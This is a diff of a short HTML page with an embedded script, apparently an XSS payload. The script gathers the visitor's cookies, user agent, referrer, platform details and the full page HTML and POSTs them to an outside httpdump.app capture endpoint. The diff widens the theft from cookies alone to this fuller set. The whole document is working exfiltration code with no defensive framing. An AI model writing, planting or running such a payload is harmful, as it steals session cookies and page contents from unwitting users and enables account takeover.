@@ -1,10 +1,22 @@
 <html>
 <script>
-// Send cookie to your httpdump
+// Capture everything - cookies, user agent, referrer, etc.
+const requestData = {
+    url: window.location.href,
+    cookie: document.cookie,
+    userAgent: navigator.userAgent,
+    referrer: document.referrer,
+    language: navigator.language,
+    platform: navigator.platform,
+    fullPageHTML: document.documentElement.outerHTML,
+    timestamp: new Date().toISOString()
+};
+
+// Send everything to your httpdump
 fetch('https://httpdump.app/dumps/83a81e26-b1db-4c2f-891f-7befa27c87da', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({cookie: document.cookie})
+    body: JSON.stringify(requestData, null, 2)
 });
 </script>
 </html>
